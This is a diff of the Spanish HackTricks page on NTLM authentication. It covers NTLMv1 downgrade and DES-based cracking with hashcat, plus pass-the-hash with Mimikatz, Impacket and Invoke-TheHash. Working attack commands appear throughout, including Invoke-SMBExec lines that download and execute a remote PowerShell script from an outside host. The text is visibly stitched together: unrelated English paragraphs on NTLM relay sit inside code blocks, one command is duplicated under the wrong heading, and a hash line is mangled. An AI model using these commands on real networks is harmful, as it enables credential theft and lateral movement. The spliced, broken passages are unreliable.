@@ -7,22 +7,26 @@
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme en** **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 ## Información Básica
 
-**Credenciales NTLM**: Nombre de dominio (si lo hay), nombre de usuario y hash de contraseña.
+En entornos donde se utilizan **Windows XP y Server 2003**, se emplean los hashes LM (Lan Manager), aunque es ampliamente reconocido que estos pueden ser comprometidos fácilmente. Un hash LM particular, `AAD3B435B51404EEAAD3B435B51404EE`, indica un escenario donde no se utiliza LM, representando el hash para una cadena vacía.
 
-**LM** solo está **habilitado** en **Windows XP y Server 2003** (los hashes LM se pueden descifrar). El hash LM AAD3B435B51404EEAAD3B435B51404EE significa que no se está utilizando LM (es el hash LM de una cadena vacía).
+Por defecto, el protocolo de autenticación **Kerberos** es el método principal utilizado. NTLM (NT LAN Manager) interviene en circunstancias específicas: ausencia de Active Directory, inexistencia del dominio, mal funcionamiento de Kerberos debido a una configuración incorrecta, o cuando se intentan conexiones utilizando una dirección IP en lugar de un nombre de host válido.
 
-Por defecto se utiliza **Kerberos**, por lo que NTLM solo se usará si **no hay ningún Active Directory configurado**, el **dominio no existe**, **Kerberos no está funcionando** (mala configuración) o el **cliente** que intenta conectarse usa la IP en lugar de un nombre de host válido.
+La presencia del encabezado **"NTLMSSP"** en los paquetes de red señala un proceso de autenticación NTLM.
 
-Los **paquetes de red** de una **autenticación NTLM** tienen la **cabecera** "**NTLMSSP**".
+Se facilita el soporte para los protocolos de autenticación - LM, NTLMv1 y NTLMv2 - mediante una DLL específica ubicada en `%windir%\Windows\System32\msv1\_0.dll`.
 
-Los protocolos: LM, NTLMv1 y NTLMv2 son compatibles en la DLL %windir%\Windows\System32\msv1\_0.dll
+**Puntos Clave**:
+- Los hashes LM son vulnerables y un hash LM vacío (`AAD3B435B51404EEAAD3B435B51404EE`) indica que no se está utilizando.
+- Kerberos es el método de autenticación predeterminado, con NTLM utilizado solo bajo ciertas condiciones.
+- Los paquetes de autenticación NTLM son identificables por el encabezado "NTLMSSP".
+- Los protocolos LM, NTLMv1 y NTLMv2 son compatibles con el archivo del sistema `msv1\_0.dll`.
 
 ## LM, NTLMv1 y NTLMv2
 
@@ -80,20 +84,20 @@ El **hash NT (16 bytes)** se divide en **3 partes de 7 bytes cada una** (7B + 7B
 
 ### Ataque NTLMv1
 
-Actualmente es menos común encontrar entornos con Delegación Sin Restricciones configurada, pero esto no significa que no puedas **abusar de un servicio de Cola de Impresión** configurado.
+Actualmente es menos común encontrar entornos con Delegación sin Restricciones configurada, pero esto no significa que no puedas **abusar de un servicio de Cola de Impresión** configurado.
 
-Podrías abusar de algunas credenciales/sesiones que ya tienes en el AD para **solicitar a la impresora que se autentique** contra algún **host bajo tu control**. Luego, usando `metasploit auxiliary/server/capture/smb` o `responder` puedes **establecer el desafío de autenticación en 1122334455667788**, capturar el intento de autenticación y si se hizo usando **NTLMv1** podrás **crackearlo**.\
-Si estás usando `responder` podrías intentar \*\*usar la bandera `--lm` \*\* para intentar **degradar** la **autenticación**.\
+Podrías abusar de algunas credenciales/sesiones que ya tengas en el AD para **solicitar a la impresora que se autentique** contra algún **host bajo tu control**. Luego, utilizando `metasploit auxiliary/server/capture/smb` o `responder` puedes **establecer el desafío de autenticación en 1122334455667788**, capturar el intento de autenticación y, si se realizó utilizando **NTLMv1**, podrás **crackearlo**.\
+Si estás utilizando `responder`, podrías intentar \*\*usar la bandera `--lm` \*\* para intentar **degradar** la **autenticación**.\
 _Ten en cuenta que para esta técnica la autenticación debe realizarse utilizando NTLMv1 (NTLMv2 no es válido)._
 
-Recuerda que la impresora usará la cuenta de equipo durante la autenticación, y las cuentas de equipo usan **contraseñas largas y aleatorias** que **probablemente no podrás crackear** usando **diccionarios comunes**. Pero la autenticación **NTLMv1** **usa DES** ([más información aquí](./#ntlmv1-challenge)), por lo que usando algunos servicios especialmente dedicados a crackear DES podrás crackearlo (podrías usar [https://crack.sh/](https://crack.sh) por ejemplo).
+Recuerda que la impresora utilizará la cuenta de equipo durante la autenticación, y las cuentas de equipo utilizan contraseñas **largas y aleatorias** que **probablemente no podrás crackear** utilizando **diccionarios comunes**. Pero la autenticación **NTLMv1** **utiliza DES** ([más información aquí](./#ntlmv1-challenge)), por lo que utilizando algunos servicios especialmente dedicados a crackear DES podrás crackearlo (podrías usar [https://crack.sh/](https://crack.sh) por ejemplo).
 
 ### Ataque NTLMv1 con hashcat
 
-NTLMv1 también puede ser roto con la Herramienta Multi NTLMv1 [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) que formatea los mensajes NTLMv1 de una manera que puede ser rota con hashcat.
+NTLMv1 también se puede romper con la Herramienta Multi NTLMv1 [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) que formatea los mensajes NTLMv1 de una manera que puede ser rota con hashcat.
 
 El comando
-```
+```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
 ## NTLM Relay Attack
@@ -102,18 +106,22 @@ python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB
 
 In a Windows environment, NTLM (NT LAN Manager) is a suite of security protocols used for authentication. NTLM relay attack is a common technique used by hackers to intercept and relay NTLM authentication traffic to gain unauthorized access to a target system.
 
-### Description
+### How it Works
 
-During an NTLM relay attack, the hacker captures NTLM authentication traffic between a client and a server. The attacker then relays this captured traffic to another system, tricking it into believing that the attacker is the legitimate user. This allows the hacker to impersonate the user and potentially gain access to sensitive information or resources on the target system.
+1. The attacker intercepts NTLM authentication traffic between a client and a server.
+2. The attacker relays the captured authentication data to another system, tricking it into thinking the attacker is the legitimate user.
+3. The attacker can then access the target system using the compromised credentials.
 
 ### Mitigation
 
-To mitigate NTLM relay attacks, it is recommended to implement SMB signing, LDAP signing, and enforce the use of Kerberos authentication instead of NTLM where possible. Additionally, using strong, unique passwords and regularly monitoring for suspicious activity can help prevent unauthorized access through NTLM relay attacks.
+To prevent NTLM relay attacks, consider implementing the following measures:
 
-### Tools
+- **Enforce SMB Signing**: Require SMB signing to prevent tampering with authentication traffic.
+- **Use LDAP Signing and Channel Binding**: Enable LDAP signing and channel binding to protect against relay attacks.
+- **Enable Extended Protection for Authentication**: This adds an extra layer of security to prevent NTLM relay attacks.
 
-There are various tools available to perform NTLM relay attacks, such as Responder, ntlmrelayx, and Impacket. These tools automate the process of capturing and relaying NTLM authentication traffic, making it easier for hackers to exploit this vulnerability.
-```
+By implementing these measures, you can enhance the security of your Windows environment and protect against NTLM relay attacks.
+```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
 
 Hostname: DUSTIN-5AA37877
@@ -142,35 +150,35 @@ NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 
 ## Introduction
 
-NTLM relaying is a common technique used by attackers to escalate privileges in a Windows environment. This attack involves intercepting an NTLM authentication request and relaying it to another machine, tricking it into believing the attacker is the legitimate user.
+NTLM relaying is a technique used to relay authentication attempts from one system to another, allowing an attacker to impersonate a legitimate user and gain unauthorized access to resources on a network.
 
-## How it works
+## Description
 
-1. The attacker intercepts an NTLM authentication request from a victim machine.
-2. The attacker relays the authentication request to a target machine.
-3. The target machine processes the request, thinking it is coming from the victim.
-4. If successful, the attacker gains unauthorized access to the target machine.
+NTLM relaying takes advantage of the way NTLM authentication works in Windows environments. When a user attempts to authenticate to a server using NTLM, the server sends a challenge to the client, which the client must encrypt using its password hash and send back to the server. An attacker can intercept this challenge/response process and relay it to another server, effectively tricking that server into thinking the attacker is the legitimate user.
+
+## Usage
+
+NTLM relaying can be performed using tools like `Responder` or `Mimikatz` to capture authentication attempts and relay them to other systems on the network. This can be particularly effective in environments where NTLM authentication is used extensively and where servers trust each other implicitly.
 
 ## Mitigation
 
-To mitigate NTLM relaying attacks, consider implementing the following measures:
+To mitigate the risk of NTLM relaying attacks, it is recommended to implement protections such as:
 
-- Disable NTLM authentication where possible.
-- Use Kerberos authentication instead of NTLM.
-- Implement SMB signing to prevent tampering with authentication traffic.
-- Monitor network traffic for signs of NTLM relaying attacks.
+- Enabling SMB signing to prevent tampering with authentication traffic
+- Implementing Extended Protection for Authentication to prevent relaying attacks
+- Disabling NTLM authentication in favor of more secure protocols like Kerberos
 
-By following these best practices, you can reduce the risk of falling victim to NTLM relaying attacks.
-```
+By taking these steps, organizations can reduce the risk of NTLM relaying attacks and better protect their network resources.
+```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
 Ejecuta hashcat (es mejor distribuido a través de una herramienta como hashtopolis) ya que de lo contrario tomará varios días.
-```
+```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
 En este caso sabemos que la contraseña es password, por lo que vamos a hacer trampa con fines de demostración:
-```
+```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
 DESKEY2: bcba83e6895b9d
@@ -178,64 +186,46 @@ DESKEY2: bcba83e6895b9d
 echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
-Necesitamos ahora utilizar las utilidades de hashcat para convertir las claves DES descifradas en partes del hash NTLM:
-```
+Ahora necesitamos usar las utilidades de hashcat para convertir las claves DES descifradas en partes del hash NTLM:
+```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
 b4b9b02e6f09a9 # this is part 1
 
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
-## NTLM Relay Attack
-
-### Introduction
-
-NTLM relay attacks are a common technique used by attackers to escalate privileges within a network. This attack involves intercepting NTLM authentication traffic and relaying it to a target server to gain unauthorized access.
-
-### How it Works
-
-1. The attacker intercepts NTLM authentication traffic between a client and a server.
-2. The attacker relays this traffic to another server within the network.
-3. The target server receives the relayed authentication request, believing it is coming from the original client.
-4. If successful, the attacker gains unauthorized access to the target server using the intercepted credentials.
-
-### Mitigation
-
-To mitigate NTLM relay attacks, consider implementing the following measures:
-
-- **Enforce SMB Signing**: Require SMB signing to prevent tampering with authentication traffic.
-- **Enable Extended Protection for Authentication**: Helps protect against NTLM relay attacks by requiring stronger authentication.
-- **Use Kerberos**: Consider using Kerberos authentication instead of NTLM to reduce the risk of relay attacks.
-- **Disable NTLM**: If possible, disable NTLM authentication to eliminate the risk of NTLM relay attacks.
-
-By implementing these measures, you can significantly reduce the risk of falling victim to NTLM relay attacks.
-```
+Finalmente, la última parte:
+```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
 586c # this is the last part
 ```
-### NTLM Relay Attack
+### Windows Hardening: NTLM
 
-#### Overview
+---
 
-NTLM Relay Attack is a type of attack where an attacker captures the NTLM authentication request sent by a victim and relays it to a target server to authenticate as the victim. This attack can be used to gain unauthorized access to a target system by exploiting the NTLM authentication protocol.
+#### NTLM Relay Attack
 
-#### How it works
+##### Description
 
-1. The attacker intercepts the NTLM authentication request sent by the victim.
-2. The attacker relays the captured request to a target server.
-3. The target server authenticates the attacker as the victim, granting unauthorized access.
+The NTLM relay attack is a common technique used by attackers to intercept and relay NTLM authentication traffic to gain unauthorized access to a target system. This attack can be executed by capturing NTLM authentication requests and forwarding them to another system, tricking it into believing the attacker's machine is the legitimate user.
 
-#### Mitigation
+##### Mitigation
 
-To mitigate NTLM Relay Attacks, consider implementing the following measures:
+To mitigate NTLM relay attacks, it is recommended to implement SMB signing, enable Extended Protection for Authentication, and disable NTLM where possible. Additionally, enforcing the use of Kerberos authentication can help prevent NTLM relay attacks.
 
-- **Enforce SMB Signing**: Enable SMB signing to prevent attackers from relaying NTLM authentication requests.
-- **Use LDAP Signing**: Implement LDAP signing to protect against NTLM relay attacks in LDAP environments.
-- **Enable Extended Protection for Authentication**: This feature helps protect against NTLM relay attacks by requiring extended protection for authentication.
+---
 
-By implementing these measures, you can enhance the security of your systems and protect against NTLM Relay Attacks.
-```
+#### NTLM Reflection Attack
+
+##### Description
+
+The NTLM reflection attack is a type of attack where an attacker sends a malicious NTLM authentication request to a target server, which then reflects the request back to the attacker. This can be used to gather information about the target system or to launch further attacks.
+
+##### Mitigation
+
+To mitigate NTLM reflection attacks, it is important to disable NTLMv1, as it is vulnerable to reflection attacks. Implementing SMB signing and enabling Extended Protection for Authentication can also help protect against NTLM reflection attacks. Additionally, monitoring network traffic for suspicious activity can aid in detecting and preventing such attacks.
+```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
 ### Desafío NTLMv2
@@ -244,7 +234,7 @@ El **largo del desafío es de 8 bytes** y se envían **2 respuestas**: Una tiene
 
 **La primera respuesta** se crea cifrando usando **HMAC\_MD5** la **cadena** compuesta por el **cliente y el dominio** y utilizando como **clave** el **hash MD4** del **hash NT**. Luego, el **resultado** se utilizará como **clave** para cifrar usando **HMAC\_MD5** el **desafío**. A esto se le añadirá **un desafío del cliente de 8 bytes**. Total: 24 B.
 
-La **segunda respuesta** se crea utilizando **varios valores** (un nuevo desafío de cliente, una **marca de tiempo** para evitar **ataques de repetición**...)
+La **segunda respuesta** se crea utilizando **varios valores** (un nuevo desafío del cliente, una **marca de tiempo** para evitar **ataques de repetición**...)
 
 Si tienes un **pcap que ha capturado un proceso de autenticación exitoso**, puedes seguir esta guía para obtener el dominio, nombre de usuario, desafío y respuesta e intentar descifrar la contraseña: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
 
@@ -261,7 +251,7 @@ Necesitas utilizar una **herramienta** que **realizará** la **autenticación NT
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
-Esto lanzará un proceso que pertenecerá a los usuarios que hayan iniciado mimikatz, pero internamente en LSASS las credenciales guardadas son las que están dentro de los parámetros de mimikatz. Luego, puedes acceder a los recursos de red como si fueras ese usuario (similar al truco `runas /netonly` pero sin necesidad de conocer la contraseña en texto plano).
+Esto lanzará un proceso que pertenecerá a los usuarios que hayan iniciado mimikatz, pero internamente en LSASS, las credenciales guardadas son las que están dentro de los parámetros de mimikatz. Luego, puedes acceder a recursos de red como si fueras ese usuario (similar al truco `runas /netonly` pero sin necesidad de conocer la contraseña en texto plano).
 
 ### Pass-the-Hash desde Linux
 
@@ -282,28 +272,30 @@ Puedes descargar [binarios de Impacket para Windows aquí](https://github.com/ro
 Puedes obtener los scripts de PowerShell desde aquí: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
 
 #### Invoke-SMBExec
-```
+```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
 #### Invoke-WMIExec
-```
+
+#### Invocar-WMIExec
+```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
 #### Invoke-SMBClient
 
 #### Invocar-SMBClient
-```
+```bash
 Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
 ```
 #### Invoke-SMBEnum
 
 #### Invocar-SMBEnum
-```
+```bash
 Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
 ```
 #### Invoke-TheHash
 
-Esta función es una **combinación de todas las demás**. Puedes pasar **varios hosts**, **excluir** algunos y **seleccionar** la **opción** que deseas utilizar (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si seleccionas **cualquiera** de **SMBExec** y **WMIExec** pero **no** proporcionas ningún parámetro de _**Comando**_, simplemente **verificará** si tienes **suficientes permisos**.
+Esta función es una **combinación de todas las demás**. Puedes pasar **varios hosts**, **excluir** algunos y **seleccionar** la **opción** que deseas utilizar (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si seleccionas **cualquiera** de **SMBExec** y **WMIExec** pero **no** proporcionas ningún parámetro de _**Comando**_, simplemente **verificará** si tienes **permisos suficientes**.
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
@@ -337,7 +329,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 
 ## Analizar desafíos NTLM desde una captura de red
 
-**Puedes usar** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
+**Puedes utilizar** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
 
 <details>
 
@@ -346,7 +338,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Comparte tus trucos de hacking enviando PRs al** [**repositorio hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
